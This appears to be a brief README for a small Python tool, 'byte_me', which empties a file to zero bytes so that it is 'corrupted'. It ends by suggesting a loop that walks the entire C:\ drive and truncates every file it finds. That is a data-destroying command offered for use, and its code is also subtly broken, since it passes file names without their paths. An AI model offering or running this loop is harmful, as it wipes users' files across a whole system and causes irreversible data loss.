# byte_me
get it, funny joke. 
Anyway it literally just opens a file as a new file, erasing all the data and putting it to 0 bytes.

The only point of this file is so that I can "Corrupt" files.

byte_me.eat(path)



you cooooould do this then.

for root, dirs, files in os.walk("C:\\"):

        for name in files:
        
          byte_me.eat(name)
